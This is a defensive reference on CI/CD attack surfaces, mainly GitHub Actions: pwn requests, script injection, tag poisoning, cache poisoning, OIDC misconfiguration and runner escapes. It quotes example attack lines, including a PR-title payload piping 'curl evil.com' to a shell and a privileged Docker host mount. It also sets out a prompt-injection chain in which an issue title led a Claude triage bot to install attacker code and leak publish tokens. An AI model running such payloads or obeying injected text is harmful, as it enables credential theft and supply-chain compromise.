# CI/CD and Build-System Attack Surface — Primitives, Real Incidents, and Defenses
## Synthesized from Adnan Khan, Karim Rahal, Iain Smart, the GitHub Security Lab and OpenSSF Scorecard teams, the StepSecurity research team, the Aqua Security and Argon researchers, the NCC Group CI/CD practice, the Chainguard / sigstore / SLSA contributors, Mandiant and Unit 42 incident responders, and Kurt Boberg

> **Primary researchers:**
> - **Adnan Khan** (@adnanthekhan, adnanthekhan.com) — The most prolific independent researcher of GitHub Actions attack surface from 2022 onward. Practitioner-popularizer of "Pwn Request"; built **Gato-X** (the canonical static-analysis-plus-exploit toolkit for Actions); published *Monsters in Your Build Cache* (May 2024) and *Cacheract* (Dec 2024) on Actions cache poisoning, later using Cacheract against Angular's dev-infra to exfiltrate the `angular-robot` PAT (reported Dec 2025). Author of *Long Live the Pwn Request* (Praetorian blog, Sep 2023). `ActionsTOCTOU` is his reference repo for time-of-check-to-time-of-use against workflows.
> - **Karim Rahal** (karimrahal.com) — Researcher of GitHub Actions runner internals and secret-leakage primitives (*Leaking Secrets From GitHub Actions*, Jan 2023).
> - **Iain Smart** (@smarticu5, blog.iainsmart.co.uk) — Leads NCC Group's Containerisation and Orchestration practice. Co-author with Viktor Gazdag, Aaron Haymore, Divya Natesan, and Jennifer Fernick of *10 real-world stories of how we've compromised CI/CD pipelines* (NCC Group Research, Jan 2022) and the Black Hat USA 2022 talk *RCE-as-a-Service*. The "CI/CD pipeline as RCE-as-a-service" framing is theirs.
> - **The StepSecurity team** (Varun Sharma + collaborators, step-security.io) — Authors of **harden-runner**, the Actions runner egress-filter and process-monitoring agent that functions as an EDR for GitHub Actions. First detector of the tj-actions/changed-files compromise (Mar 14 2025) via anomaly detection on outbound traffic; the 24/7 SOC maintains a global block list of IPs and domains tied to active supply-chain campaigns.
> - **The Aqua Security / Argon research team** — Author of the *Argon Software Supply Chain Attacks More Than Tripled in 2021* report; ongoing contributor to OWASP CI/CD Top 10. Argon's source → build → publish framing became the OWASP project's substrate.
> - **The Chainguard / sigstore / SLSA contributors** — Dan Lorenc, Kim Lewandowski, Bob Callaway, Luke Hinds, and the broader OpenSSF Sigstore project. SLSA v1.1 codifies the L0–L3 ladder; cosign/fulcio/rekor are the keyless-signing reference referenced by SLSA and the GitHub Actions provenance flow.
> - **Daniel Krivelevich (formerly Cider, now Palo Alto Networks) and the OWASP CI/CD Top 10 working group** — The 2022 OWASP CI/CD Top 10 Security Risks project is the consensus practitioner taxonomy. Krivelevich led the Cider Security research that produced the original draft before the Palo Alto acquisition.
> - **GitHub Security Lab** (securitylab.github.com) — The CodeQL CVE corpus on GitHub Actions; ongoing *Keeping your GitHub Actions and workflows secure* series (Parts 1–4). The "untrusted input" sink list (`github.event.pull_request.title`, `github.event.issue.body`, etc.) used by every Actions static analyzer originates here.
> - **Mandiant (Google Cloud Threat Intelligence) and Palo Alto Unit 42** — Premier incident-response sources for build-system compromise. Mandiant's reports on SUNBURST (2020), 3CX/X_TRADER (2023), the *UNC5537 Snowflake* campaign (2024), plus Unit 42's *tj-actions targeted attack on Coinbase* (2025), are the working corpus.
> - **E.V.A Information Security** (Eran Vaknin and collaborators, evasec.io) — Discoverers of the 2024 CocoaPods Trunk compromises (CVE-2024-38366/38367/38368), including a zero-click account takeover via HTTP-header spoofing (CVE-2024-38367) and orphaned-pod ownership claims (CVE-2024-38368).
> - **Alex Birsan** (@alxbrsn) — *Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies* (Feb 2021). The eponymous primitive of namespace-shadowing across npm / PyPI / RubyGems / nuget.
> - **Kurt Boberg** (@lapt0r) — Co-author of *Popular GitHub Action tj-actions/changed-files is compromised* (semgrep.dev/blog, Mar 2025).
>
> Sources: adnanthekhan.com; github.com/AdnaneKhan/{gato-x,ActionsTOCTOU}; research.nccgroup.com; stepsecurity.io; aquasec.com; slsa.dev v1.1; sigstore.dev; cloud.google.com/blog/topics/threat-intelligence (Mandiant); unit42.paloaltonetworks.com; evasec.io; semgrep.dev/blog/2025/; cisa.gov; owasp.org/www-project-top-10-ci-cd-security-risks; securitylab.github.com; circleci.com/blog/jan-4-2023-incident-report/; about.codecov.io/apr-2021-post-mortem/; en.wikipedia.org/wiki/XZ_Utils_backdoor.

---

## 1. The CI Threat Model

### The four trust boundaries

Every CI/CD compromise reduces to a failure at one of four boundaries:

1. **Source-control event → workflow trigger.** Who is allowed to cause a workflow to fire, with what payload? The pull-request-from-fork case is the most-exploited shape because the trigger is reachable by any anonymous attacker who can create a GitHub account.
2. **Workflow trigger → runner execution.** What code runs, on whose machine, with which secrets and tokens? The checkout ref, the templated `${{ github.event.* }}` values, the `uses:` references, and the runner type (hosted vs self-hosted) decide the blast radius.
3. **Runner execution → artifact production.** What does the runner produce, and what registries / cloud accounts trust the output? Code-signing keys, registry credentials, deploy tokens, and OIDC trust policies sit here.
4. **Artifact distribution → consumption.** Who pulls the artifact, with what verification? SHA pinning vs version pinning vs floating tags vs `latest` is decided here. SLSA's ladder measures how strong the controls are at boundary 3 so that boundary 4 can verify them.

Every incident in §6 lives at one of these four boundaries. Ambiguous findings usually sit at 2 or 3.

### Who can trigger which workflows

The single most-misunderstood property of GitHub Actions (and every comparable substrate) is **trigger-privilege asymmetry**. Some triggers fire from the PR head with no secrets and a read-only token. Other triggers fire from the default branch with full secrets and a read/write token even though the payload originated from the PR author. The pwn-request class is what happens when these two are conflated.

For GitHub Actions specifically:

| Trigger | Code that runs | Token scope | Secrets present | Notes |
|---|---|---|---|---|
| `pull_request` (from fork) | PR HEAD | read-only `GITHUB_TOKEN`, no `secrets.*` | No | Safe default; the model is "untrusted code runs with no privilege." |
| `pull_request` (same-repo branch) | PR HEAD | scoped `GITHUB_TOKEN` | Yes (in same-repo PRs) | Trusted because only members with write can push the branch. |
| `pull_request_target` | DEFAULT BRANCH (NOT PR HEAD) | write `GITHUB_TOKEN` | Yes (full `secrets.*`) | The pwn-request primitive lives here; see §2. |
| `workflow_run` (chained) | DEFAULT BRANCH | write `GITHUB_TOKEN` | Yes | Triggered by the completion of an upstream workflow; same privilege escalation shape as `pull_request_target`. |
| `issue_comment` | DEFAULT BRANCH | write `GITHUB_TOKEN` | Yes | Untrusted body in `${{ github.event.comment.body }}`; interpolation = RCE. |
| `push` to default branch | DEFAULT BRANCH | write `GITHUB_TOKEN` | Yes | Inside the branch-protection-trust boundary. |
| `schedule` / `workflow_dispatch` | DEFAULT BRANCH | write `GITHUB_TOKEN` | Yes | Inside the trust boundary by default. |

The structural rule: **`pull_request_target` and `workflow_run` are the only triggers where untrusted input crosses the secrets boundary by design.** Every other "fork PR exfiltrates secrets" finding is a misconfiguration layered on top of one of those two triggers. GitLab CI's `merge_request_event` pipelines, CircleCI's fork builds, and Jenkins's GHPRB plugin have analogous distinctions — the names differ, the structure does not.

### Forked-PR token semantics

For `pull_request` from a fork on GitHub-hosted runners: `GITHUB_TOKEN` is read-only, `secrets.*` interpolation evaluates to empty strings, the token cannot push to base, cannot dispatch other workflows, cannot write to packages.

For `pull_request_target` on the same fork PR: `GITHUB_TOKEN` is issued from the *base* repository with full secrets and write permissions. The default checkout (`actions/checkout` with no `ref:` override) checks out the base branch — *not* the PR HEAD. The danger materializes when someone adds `ref: ${{ github.event.pull_request.head.sha }}` "to actually test the PR." Untrusted code now runs with full privilege.

The same principle reappears in every substrate: fork PRs from anonymous attackers run with no privilege unless the author has explicitly opted into the high-privilege chained trigger *and also* opted into running PR code under that trigger. Pwn-request CVEs are the conjunction.

### Default-branch privilege and branch protection

Default-branch triggers (`push`, `schedule`, `workflow_dispatch`, `pull_request_target`, `workflow_run`) see full secrets and a writable `GITHUB_TOKEN`. Branch protection enforces the default-branch boundary; effective protection requires all of:

- Required PR reviews with `dismiss_stale_reviews: true`.
- Required status checks (CI + Scorecard).
- Required signed commits (the only reliable defense against a stolen credential pushing directly).
- Restricted push allowlist; no bypass-pull-request-allowances on bots or broad write groups.
- `allow_force_pushes = false`, `allow_deletions = false`.
- **CODEOWNERS on `.github/workflows/`.** Meta-protect the meta — workflow modifications require workflow-team review. Without this, a PR can modify a workflow to do anything under the privileged trigger that fires post-merge.

The branch-protection-bypass-via-Actions footgun: a workflow with `permissions: contents: write` may push to `main` as `github-actions[bot]` even with "Restrict who can push" set, depending on the rules. Apply CODEOWNERS plus "do not allow bypassing the above settings" plus an explicit GitHub-Actions push allowlist.

### Self-hosted runner threat model

Self-hosted runners invert the GitHub-hosted assumption that the runner VM is destroyed after each job:

- **Persistence.** Cached layers, SSH keys, `git` config, runner-agent credentials all persist across jobs unless explicitly cleaned.
- **Network reachability.** Self-hosted runners live in *your* network: internal services, cloud metadata (169.254.169.254 on AWS; metadata.google.internal on GCP), Kubernetes APIs, internal registries, secrets managers.
- **Cross-tenant contamination.** A shared runner pool poisoned by one team's job leaks to the next team's job.
- **Public-repo on self-hosted runner = open RCE.** GitHub's docs are explicit: "use self-hosted runners only with private repositories."

Adnan Khan's Gato-X surfaces public-self-hosted-runner footguns at scale; mass-scan mode finds dozens per org-scoped sweep.

### Supply-chain layering

```
developer machine (incl. AI coding tools) → SCM (GitHub/GitLab/Bitbucket) → CI/CD (Actions/GitLab/CircleCI/Jenkins/Drone/Buildkite) → build env (runner OS, base images, cached deps) → registry (npm/PyPI/Maven/Docker Hub/GHCR/Releases) → distribution (CDN/mirror) → consumer
```

A compromise at any layer propagates downward. SolarWinds was a build-environment compromise that produced a signed registry artifact. tj-actions was a CI-layer compromise that exfiltrated secrets from thousands of consumers. xz-utils was a maintainer-commit compromise hidden in the release tarball's m4 build script. Map every defense to a layer.

---

## 2. GitHub Actions Specific Attacks

### 2.1 Pwn Request (`pull_request_target` + PR-HEAD checkout)

The canonical primitive — Adnan Khan and Praetorian's *Long Live the Pwn Request: Hacking Microsoft GitHub Repositories and More* documents high-impact instances. Shape:

```yaml
on:
  pull_request_target:                 # runs from base, has secrets
    types: [opened, synchronize]
jobs:
  test:
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # UNTRUSTED CODE
      - run: npm install && npm test            # secrets in env, untrusted code
```

The attacker opens a fork PR; the workflow fires on `pull_request_target` (base branch perspective, full secrets) but checks out the PR HEAD and runs it under the secrets context. Any `postinstall`, downloaded test script, or `Makefile`-invoked `curl | sh` executes with `secrets.*`.

Defenses in cost order: (1) don't check out the PR HEAD under `pull_request_target` — label/comment metadata operations don't need untrusted code; (2) drop privileges first via a `pull_request` workflow whose output artifact is consumed by a separate `workflow_run` job under secrets; (3) gate the unsafe job behind a maintainer-applied `ok-to-test` label, and pin the labeler's reviewed SHA literally so a post-label force-push doesn't slip through (the TOCTOU primitive).

Corpus: Microsoft Azure repos (Praetorian), multiple Google projects.

### 2.2 Script injection via `${{ github.event.* }}` interpolation

Second-most-common. YAML templating substitutes `${{ github.event.pull_request.title }}` into the shell command line *before* the shell parses it. A PR title of `" && curl evil.com | sh && echo "` becomes:

```
echo "PR title: " && curl evil.com | sh && echo ""
```

Fix: bind the untrusted value to an environment variable and reference *that* from the shell — parameter expansion is one layer further from interpolation:

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
```

Canonical untrusted sinks (most are listed in GitHub Security Lab Part 2, *Untrusted input*): `pull_request.title|body|head.ref|head.label|head.repo.description|head.repo.homepage`, `issue.title|body`, `comment.body`, `commits.*.message|author.email|author.name`, `pages.*.page_name`, `discussion.title|body`, `review.body`, `review_comment.body`, `inputs.*` (workflow_dispatch). Flag these inside `run:` and `with:` args.

### 2.3 Action poisoning via mutable refs (tj-actions / CVE-2025-30066)

The most-impactful CI/CD incident of 2025: **tj-actions/changed-files** compromise on March 14–15 2025 — used by ~23,000 repos, substrate of a targeted attack on Coinbase that fanned out.

Root cause: attacker compromised the PAT of the `@tj-actions-bot` account (vector publicly unknown); bot had push to the action repo. Attacker created a malicious commit in a fork containing a payload that dumped Runner Worker process memory secrets to Actions logs, then **force-moved every existing version tag** (`v1`…`v45.0.7`) to point at it. Public-repo log readers exfiltrated; no external C2 needed.

Detection: StepSecurity harden-runner anomaly-detected unexpected egress and raised the alarm. GitHub removed the action ~24h after onset; cleaned versions republished as `v46.0.1+`.

Defenses (the **SHA-pinning + Renovate + harden-runner** stack):

- Pin every third-party action to a full SHA, not a tag. Tags are mutable; SHAs are not absent a force-push to a branch that overwrites history (detectable via integrity logs).
- Pin first-party (within-org) actions to SHA too — a compromised maintainer in your own org has the same primitive.
- Add the readable version as a comment: `uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2`.
- Renovate or Dependabot auto-PRs SHA bumps so the readable comment stays current and each bump is reviewed.
- Layer harden-runner egress filtering so anomalous outbound is blocked or alerted.

Cross-ref: the org-managed `/Library/Application Support/ClaudeCode/CLAUDE.md` codifies SHA-pinning + harden-runner as policy. Boberg co-authored the Semgrep response post (semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/).

### 2.4 `workflow_run` chained privilege escalation

`workflow_run` fires when another workflow completes — from the *default branch* with full secrets, regardless of which branch triggered the upstream. Intended use: "after CI passes, deploy." Danger: an upstream `pull_request` trigger from a fork can pass attacker-controlled artifacts, status outputs, or even modified workflow YAML to the downstream privileged step.

Common failures: (a) downstream downloads an artifact built from untrusted PR code and executes it; (b) downstream reads `github.event.workflow_run.head_branch|head_sha` and checks out that ref under privilege; (c) the fork modifies the upstream workflow's own YAML (fork-writes are unrestricted), so the upstream fires from the modified definition and `workflow_run` re-fires based on its signal — Snyk Labs' *Call for action* documents the transitive trust.

Defense: treat `workflow_run` exactly like `pull_request_target`. Never check out a head SHA from the upstream event. Validate artifacts with explicit allowlists before execution.

### 2.5 Reusable workflow `@main` pin

Reusable workflows (`uses: org/repo/.github/workflows/foo.yml@<ref>`) are remote includes. Same pinning discipline as third-party actions; the same mutable-ref attack works. Pin to SHA. `uses: my-org/shared-workflows/.github/workflows/deploy.yml@main` is a backdoor waiting to happen.

### 2.6 OIDC token confusion

GitHub Actions OIDC issues a short-lived JWT; cloud providers consume it via trust policy to issue cloud credentials. Standard claims: `iss`, `sub`, `aud`; custom claims include `repository`, `repository_id`, `repository_owner`, `workflow_ref`, `workflow_sha`, `job_workflow_ref`, `actor`, `actor_id`, `environment`, `ref`, `event_name`, `head_ref`, `base_ref`.

Most-common misconfiguration: an AWS IAM trust policy validating only `iss` and `aud` — but not constraining `sub`. Any workflow in any repo on the internet can then assume the role. Correct shape:

```json
{
  "Condition": {
    "StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"},
    "StringLike":   {"token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:environment:production"}
  }
}
```

For multi-repo trust, prefer `repository_id` (immutable, numeric) over `repository` (string, mutable on rename). AWS STS now supports provider-specific claim validation for GitHub / Google / CircleCI / OCI.

### 2.7 Cache poisoning

Adnan Khan's *Monsters in Your Build Cache* (May 2024) and *Cacheract* (Dec 2024). `actions/cache` is keyed by content hash; a PR workflow can `cache/save` against a key derived from `hashFiles('**/lockfile')` where the lockfile is attacker-controlled. Even if the PR workflow drops privilege, the cached *content* is whatever the PR job produced. A later default-branch workflow that `cache/restore`s the same key executes attacker-controlled cached binaries — Khan later used Cacheract against Angular's dev-infra to exfiltrate the `angular-robot` PAT.

Defense: disable cache restoration in privileged workflows, namespace cache keys per-branch or per-trigger so PR-built caches are unreachable from main, or use harden-runner's cache monitoring.

**Nov 2025 GitHub Actions cache LRU change.** GitHub introduced a behavior change in Nov 2025 — flagged by Adnan Khan's Clinejection writeup (referenced in §2.9 step 3) — enforcing LRU eviction promptly once a repo's Actions cache exceeds its 10 GB limit (previously eviction ran every 24 hours). The change matters operationally for cache poisoning because Cacheract's flood-then-claim shape (write >10 GB of attacker-controlled cache entries to evict legitimate ones, then claim the vacated keys with poisoned content) becomes a reliably-sized primitive against the new threshold. Defenders relying on cache contents in privileged-execution paths should re-evaluate against the new LRU behavior; the Nov 2025 change closed an implicit safety margin that many repos relied on without realizing. Primary source: `adnanthekhan.com/posts/clinejection/`.

### 2.8 TOCTOU on Actions workflows

`AdnaneKhan/ActionsTOCTOU` is the reference repo. Shape: a workflow validates `github.event.pull_request.head.sha` (e.g., "approved by a maintainer"), then performs the privileged action minutes later on the same `head.sha` context — but the attacker force-pushes between check and use; the second ref-resolution points at new code. Defense: pass the exact SHA observed at check time as a literal input; never re-resolve the ref.

### 2.9 AI-era variant: prompt injection of triage bots (Clinejection)

The pwn-request class has an AI-substrate variant. Any LLM agent running inside a GitHub Actions workflow with write tokens and shell access becomes reachable through whatever attacker-controlled text the model reads as instruction-shaped content. The trigger does not have to be `pull_request_target`; the conjunction that produces the primitive is "untrusted text" plus "agent with tool access" plus "privileged context."

**Clinejection (GHSA-9ppg-jx86-fqw7).** Adnan Khan reported the bug privately to Cline on Jan 1 2026, published the writeup on Feb 9 2026, and on Feb 17 2026 an unrelated attacker exploited the still-extant pivot to publish `cline@2.3.0` to npm. Cline removed the vulnerable workflows within 30 minutes of the Feb 9 disclosure but deleted the wrong npm token; the exposed token was revoked on Feb 17 after the unauthorized publish. The shape is now the canonical demonstration of the class.

On Dec 21 2025, Cline added a GitHub Actions workflow that ran `claude-code-action` on the `issues` event to auto-triage incoming reports. Three configuration choices stacked into the primitive: `allowed_non_write_users: "*"` (any GitHub account holder could trigger the workflow by opening an issue), tool allowlist `"Bash,Read,Write,Edit,Glob,Grep,WebFetch,WebSearch"` (shell execution under the default-branch `GITHUB_TOKEN`), and direct interpolation of the issue title into the prompt sent to Claude. Cline's post-mortem describes the root cause in one sentence: "This created a prompt injection vulnerability. An attacker could craft an issue title containing instructions that trick Claude into running arbitrary code on the GitHub Actions runner."

The chain Khan demonstrated:

1. Attacker opens an issue with a title containing instruction-shaped text — for example, content claiming a "tool error" requiring `npm install` from an attacker-controlled GitHub fork before the bot can proceed.
2. The triage workflow fires on the `issues` event with the issue title interpolated into the prompt. Claude reads it as authoritative direction and executes `npm install github:<attacker>/<fork>#<sha>`.
3. The attacker-controlled `preinstall` script runs `Cacheract` (Khan's Dec 2024 cache-poisoning primitive, §2.7). Cacheract floods the GitHub Actions cache past the ~10 GB LRU eviction threshold (GitHub began enforcing that eviction promptly in Nov 2025), evicts legitimate entries for `actions/checkout` post-step and `node_modules`, then claims the vacated keys with poisoned content.
4. The nightly publish workflow — a separate, privileged workflow with `VSCE_PAT`, `OVSX_PAT`, and `NPM_RELEASE_TOKEN` in its environment — runs on schedule, restores the poisoned cache as `node_modules`, and the planted post-step exfiltrates the three publish credentials.
5. The attacker uses the stolen `NPM_RELEASE_TOKEN` to publish a malicious npm version under a legitimate maintainer identity.

When the Feb 17 exploit landed, the published `cline@2.3.0` package was byte-identical to the prior release except for an added `postinstall` script: `npm install -g openclaw@latest`. Cline's post-mortem is explicit about the delivery mechanism — "The published package contained a single modification: an added postinstall script (`npm install -g openclaw@latest`). The CLI binary and all other package contents were byte-identical to the previous release. No malicious code was delivered." The intent appears to have been to use Cline's distribution surface as a staging point for `openclaw`, not to corrupt Cline itself; the supply-chain primitive is what mattered.

**The generalization.** This class applies to any AI bot running in a workflow triggered by attacker-controlled events. `pull_request_target` with an AI reviewer is the obvious shape — fork-PR body and diff become indirect-prompt-injection vectors with the secrets boundary already crossed. `workflow_run` chained to a fork-PR build is the transitive variant. `issue_comment` with a `/bot` command convention is the most common in practice; Probot apps and custom Slack-style triage bots typically wire into it. Renovate, Dependabot, and similar update bots with optional AI summarization features inherit the surface when the AI step has tool access to repo contents or registry tokens. The structural property is the same as the classic pwn-request: an attacker reachable from the public internet, untrusted content interpolated into a privileged execution context, and a shell — only now the shell is the LLM's tool-call surface.

Cline's post-mortem states the principle directly: "Giving an LLM shell access in a CI context where it processes untrusted input is functionally equivalent to giving every GitHub user shell access."

**Defenses, in cost order.**

- **Do not run AI triage agents on default-branch triggers.** Mirror the §2.1 defense: do the bot's work in a `pull_request` workflow from the fork-PR side with read-only tokens and no `secrets.*`, and pass output back to a privileged downstream step only via explicitly typed, validated metadata (label, sentiment label, structured JSON conforming to a schema). Untrusted issue/PR text never reaches the privileged context.
- **Constrain the tool allowlist.** `Bash,Write,Edit` in an agent's tool set on a workflow with secrets is the equivalent of a public-self-hosted runner. Strip tool access to read-only operations (`Read,Glob,Grep` with no `Bash`) for any agent triggered by untrusted text. If shell is required, scope it to a no-secret, no-token sub-container.
- **Drop `permissions:` to read-only by default.** `permissions: contents: read` at workflow top, opt-in per-job for anything writeable. The bot does not need `packages: write` or `contents: write` to triage an issue.
- **Isolate publish credentials from triage workflows.** Nightly publish, marketplace publish, and registry-write workflows must not share a cache scope, a runner, or a token environment with any workflow that processes untrusted content. Namespaced cache keys per-trigger (`cache-${{ github.event_name }}-...`) and per-workflow self-hosted runner pools enforce the separation.
- **Move to OIDC trusted publishers.** Long-lived `NPM_RELEASE_TOKEN`, `VSCE_PAT`, `OVSX_PAT` are the asset Khan's chain monetized. npm Trusted Publishing (GA Jul 2025, §7), PyPI Trusted Publishers, and OIDC-based marketplace publish flows eliminate the bearer-token primitive. Cline's remediation reads: "npm publishing now uses OIDC provenance via GitHub Actions exclusively. There are no long-lived npm tokens."
- **Output-side classifier on agent actions.** Treat the LLM's tool calls as untrusted output: a small allowlist policy in front of `Bash` ("the bot may run `gh issue label`, `gh issue comment`, and these specific git-read commands; everything else exits") catches the `npm install github:<attacker>/<fork>` shape without needing the model to refuse the injection.
- **Audit log everything.** Every tool invocation by the agent, with arguments, signed and shipped to a logging backend the workflow itself cannot edit. The class of bug Cacheract enables — exfil completes silently, with no log line visible to the maintainer until the malicious npm version surfaces — is the failure mode an immutable audit log addresses.
- **Disable AI auto-publish.** If the business risk model puts npm/PyPI/marketplace token compromise at the top, the simplest defense is "no AI-driven workflow ever holds a publish credential, regardless of how isolated the cache is." Publish remains a human-in-the-loop step; the agent files PRs and labels, never tags releases.

The class will not stay confined to Cline-the-product. Probot apps with AI integrations, custom `pull_request_target` reviewers wired to OpenAI or Anthropic APIs, Renovate with AI changelog summarization, Dependabot with AI re-review, marketplace agent-as-a-service products — anything that combines "reads attacker-controlled text" with "executes tool calls in a CI context" inherits the shape. Cross-link `~/ai/expertise/software/ai_assisted_coding_tool_security_expertise.md` §3 for the prompt-injection primitive catalog and §9 for the AI-PR-review platform threat model that this attack instantiates on the CI side.

Primary sources: Adnan Khan, *Clinejection* (Feb 9 2026, adnanthekhan.com/posts/clinejection/); Cline post-mortem (cline.bot/blog/post-mortem-unauthorized-cline-cli-npm); Snyk, *Cline Supply Chain Attack: Prompt Injection via GitHub Actions*; GHSA-9ppg-jx86-fqw7 (published Feb 19 2026; no CVE assigned as of writing).

### 2.10 AI-action-as-dependency: `claude-code-action` and the class

`anthropics/claude-code-action` is the GitHub Action that wraps Claude Code for use inside Actions workflows — the action that landed the Clinejection primitive (§2.9). It is worth a dedicated treatment because the "AI-action-as-dependency" class will not stay confined to claude-code-action: similar actions for OpenAI / Gemini / open-weight backends exist, and the structural failure modes generalize across providers.

**The action's authority surface.** The action consumes a prompt that the workflow author interpolates from event-context expressions (`${{ github.event.issue.title }}`, `${{ github.event.pull_request.body }}`, `${{ github.event.comment.body }}`), invokes the configured LLM provider, and exercises a tool surface declared by the workflow author. The action runs as a step inside the workflow's job context, which means it inherits whatever `GITHUB_TOKEN` permissions and `secrets.*` the workflow declared. The Cline configuration (§2.9) combined `allowed_non_write_users: "*"` (no maintainer gate), full `Bash` tool access, an `issues`-event trigger interpolating the issue title into the prompt, and default-branch execution context with `NPM_RELEASE_TOKEN` / `VSCE_PAT` / `OVSX_PAT` reachable through the nightly publish workflow. Each configuration choice in isolation looks ordinary; the stack is what produced RCE.

**Three configuration axes determine the action's attack surface**, in order of severity:

1. **Trigger authorization.** Who can cause the workflow to fire? `pull_request_target` and `issues` events default to "anyone with a GitHub account." `allowed_non_write_users: "*"` keeps that wide-open even when the action's input-gating layer might otherwise narrow it. The structural rule: trigger gating is the *first* defense, not a fallback — once the workflow fires, the secrets boundary is already crossed. Mirrors the §2.1 pwn-request defense.
2. **Tool allowlist.** Each tool name granted to the agent expands the attack class. `Bash` is the obvious worst — converts any prompt injection into shell injection. `Write` and `Edit` allow agent-driven workflow self-modification (the CVE-2025-53773 shape; see `ai_assisted_coding_tool_security_expertise.md` §3). `WebFetch` is an under-appreciated exfil channel — the agent can be coerced to GET a URL with attacker-chosen path containing secret material. The allowlist should default to read-only (`Read,Glob,Grep`) for triage-class workflows; `Bash` is appropriate only in workflows isolated from default-branch secrets.
3. **Prompt-interpolation source.** Issue titles, PR titles, PR bodies, and comments are all attacker-controlled when the event fires from an external user. The interpolation site is the prompt-injection vector. Issue titles are the highest-risk source — a single fork-issue creation lands the payload with no prior interaction. PR comments are typically lower-risk (attacker has to land at least one event before injecting). Treat the interpolation expression as a `Bash -c` substitution: anything you wouldn't directly pass to a shell, don't pass to the agent's prompt.

**Adoption discipline.**

- **SHA-pin the action.** Per `~/ai/CLAUDE.md` GHA Pinning policy: `uses: anthropics/claude-code-action@<40-char-sha> # v1.2.3`. The action is published as a marketplace action, which makes tag-mutation attacks possible against any non-SHA pin (per §2.3, tj-actions class). Renovate or `step-security/harden-runner` can automate SHA bumps.
- **Restrict `allowed_non_write_users` to an explicit list.** `"*"` is the Cline misconfiguration. A maintainer-only list still requires evaluating whether those accounts have 2FA enforced and recovery paths that match the workflow's authority — an unrelated account-takeover defeats the gate.
- **Default-branch trigger isolation.** If the action runs on `issues` or `pull_request_target`, treat the workflow as running with full default-branch secrets. Either (a) split into a fork-side `pull_request` workflow with no secrets and a privileged downstream step that consumes only structured output (label / sentiment-classification JSON validated against a schema), or (b) gate the action's runtime with a GitHub Environment that requires manual approval before secrets propagate.
- **Tool allowlist minimization.** Default to `Read,Glob,Grep`; add `Edit,Write` only when the workflow is *meant* to produce code changes; add `Bash` only with a sandboxed runtime (Devcontainer, gVisor, or runner-level seccomp) — see `ai_assisted_coding_tool_security_expertise.md` §5 for the catastrophic-class analysis of shell execution under AI agents.
- **Audit-log tool invocations.** Every tool call the agent makes, with arguments, shipped to an immutable log surface (S3 with object-lock; DataDog stream; OpenTelemetry GenAI semantic conventions per `detection_engineering_expertise.md` §10). Cline's post-mortem attributes its ~8-day false-sense-of-revocation window (Feb 9–17 2026) to a failed npm token rotation — see §7 "Credential rotation verification" for the rotation-side discipline.
- **Output-side classifier.** Even with the agent's prompt secured, the action's tool calls remain the realized attack. A small policy in front of the agent's outputs ("the bot may run `gh issue label`, `gh issue comment`, and these specific git-read commands; everything else exits non-zero") catches the `npm install github:<attacker>/<fork>` shape without depending on the model to refuse the injection. This is the §2.9 defense restated.

**The class generalizes.** OpenAI's marketplace AI-action equivalents, GitHub's own Copilot Coding Agent when configured to run in Actions, the Gemini CLI Action, and any Probot app wrapping an LLM provider inherit the same configuration axes. The structural property is vendor-independent: trigger authorization × tool allowlist × prompt-interpolation source × secrets boundary. Treat any new "AI-action" dependency as a new shell-execution surface on every workflow that adopts it; do not assume the marketplace action has defaults safer than the most permissive observed configuration in the wild.

Primary sources: Adnan Khan, *Clinejection* (§2.9 references); Cline post-mortem (cline.bot/blog/post-mortem-unauthorized-cline-cli-npm); `anthropics/claude-code-action` marketplace listing on github.com/anthropics/claude-code-action.

---

## 3. GitLab CI, CircleCI, Jenkins, Drone, Buildkite

Primitives are identical; API names differ. **Any CI substrate where fork builds run with secrets has a pwn-request shape.**

**GitLab CI.** `merge_request_event` pipelines from forks (disabled by default; when enabled the threat model matches `pull_request_target`). CI/CD variables: protected vs unprotected — unprotected variables are exposed to any fork-MR pipeline. Masked variables hide values from logs but don't prevent the job from reading and exfiltrating; masking is UX, not a boundary. Trigger tokens leaked = remote RCE. Self-managed runners: don't share between public and private projects.

**CircleCI.** Contexts are the secrets boundary. Misuse: granting all jobs in an org access to a Context with production deploy creds while permitting public-repo fork-build scheduling. The Jan 4 2023 incident: laptop infostealer → SSO session cookie → cross-customer secret exfil. Lessons (a) the laptop is part of the CI surface; (b) JIT prod access with mandatory reauth; (c) infostealer malware is the dominant 2023–2025 credential-theft modality (same family drove UNC5537/Snowflake).

**Jenkins.** Agent trust model: controller holds credentials, agents execute. Default agent connection is not cryptographically pinned — rogue agents in a flat network can register and receive credentialed jobs. Use JNLP+TLS, fixed-port agents, or Kubernetes pod-templates with mTLS. Secret leakage via `echo $PASSWORD` — masking is best-effort string replacement; any transformation (base64, reverse, split) defeats it. Plugins run in-controller with controller privilege — pin versions, audit install set, subscribe to the Jenkins security advisory feed.

**Drone / Buildkite.** Webhook-replay attacks: leaked or guessable webhook secrets allow attackers to fire arbitrary pipelines. Validate signature, validate timestamp window (replay protection), validate payload schema. Buildkite agents are self-hosted on customer infrastructure — same threat model as GitHub self-hosted runners.

**Cross-substrate primitive:** fork-builds-with-secrets. Scan for the shape, not the syntax.

---

## 4. Runner / Execution-Environment Attacks

**Docker-in-Docker / `/var/run/docker.sock`.** Most-exploited container escape on CI runners. Mounting the host socket into a step lets it `docker run --privileged -v /:/host` and read/write the host filesystem (runner agent secrets, concurrent-job workspaces on shared runners, `/etc/shadow`). Defenses: rootless Docker; buildx `docker-container` driver (no host socket); QEMU-based multi-arch builds; ephemeral GitHub-hosted runners so the host is destroyed.

